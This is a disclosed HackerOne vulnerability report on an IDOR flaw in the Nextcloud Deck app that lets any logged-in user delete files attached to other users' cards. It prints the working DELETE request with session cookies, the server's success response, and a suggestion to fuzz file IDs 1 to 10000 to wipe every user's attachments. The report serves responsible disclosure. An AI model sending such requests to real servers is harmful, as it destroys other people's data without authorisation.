# Possibility to delete files attached to deck cards of other users

## Report Details
- **Report ID**: 1755555
- **URL**: https://hackerone.com/reports/1755555
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-10-30T17:13:12.582Z
- **Disclosed**: 2023-01-09T11:40:38.262Z

## Reporter
- **Username**: supr4s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi everyone,

Hope you are well ! 

I come to report here an IDOR vulnerability on the Deck application of Nextcloud, allowing to delete any attached file(s) on any cards. 

Nextcloud deck app version : latest stable `1.8.0`

## Steps To Reproduce:

The Nextcloud Deck application now offers the ability to add an attachment to its own card.
If the user deletes the attached attachment, the following POST request is made : 

```
DELETE /apps/deck/cards/63/attachment/file:116 HTTP/2
Host: redacted
Cookie: oc_sessionPassphrase=1icX1AnixyJWysU9xZCwhaEr%2Bb8TM%2FNvgck%2F1nv216h1fLefCLcWN5Vt%2BgO3%2BXH3wj4Xpo0GW4mLDt52A32%2FVZb4xUZKZq0kgpbIC1InAY8bT1UF4Ef%2BFD7ciOexHI1X; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc0xwy77immd=rm2tmgi1rtb2vs9mu7pvcnf4t8; nc_username=Test2; nc_token=6xcZzamP8jrozO48GlKsCTLiIouKgz0P; nc_session_id=rm2tmgi1rtb2vs9mu7pvcnf4t8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Requesttoken: redacted
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: green
Te: trailers
```

The `file` parameter does not offer any protection, and we can come and enter the IDs of files that do not belong to us. It is important to leave the ID of your card (63 here for me). You can then change the file ID at will, even if it is attached to another card with a different ID.

See here the response from the server, after I deleted the file with ID `117`. This file with ID `117` is attached to another user, with its own unshared personal card.

```
HTTP/2 200 OK
Server: nginx
Date: Sun, 30 Oct 2022 16:55:09 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 171
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
X-Request-Id: xRvBeA7No94R5OvXW2Vt
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
X-Robots-Tag: none
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Strict-Transport-Security: max-age=31536000; includeSubDomains;

{"cardId":63,"type":"file","data":"poteau-signalisation-1000mm-o-80mm-orange.jpg","lastModified":0,"createdAt":0,"createdBy":null,"deletedAt":0,"extendedData":[],"id":117}
```

We are here on an IDOR vulnerability, allowing any authenticated user on a Nextcloud server to delete all files attached to all cards available on the server, including cards to which we do not have access.

## Impact

From [OWASP - Broken Access Control](https://owasp.org/www-community/Broken_Access_Control) :

> Many of these flawed access control schemes are not difficult to discover and exploit. Frequently, all that is required is to craft a request for functions or content that should not be granted. Once a flaw is discovered, the consequences of a flawed access control scheme can be devastating. In addition to viewing unauthorized content, an attacker might be able to change or delete content, perform unauthorized functions, or even take over site administration.

Note here that file IDs are incremental, we can easily use a tool like Burp Intruder to fuzz our malicious request and delete file IDs ranging from 1 to 10000 for example, to be sure to impact all users of the server.

Looking forward to exchanging.

Regards,
Supr4s

## Attachments
No attachments
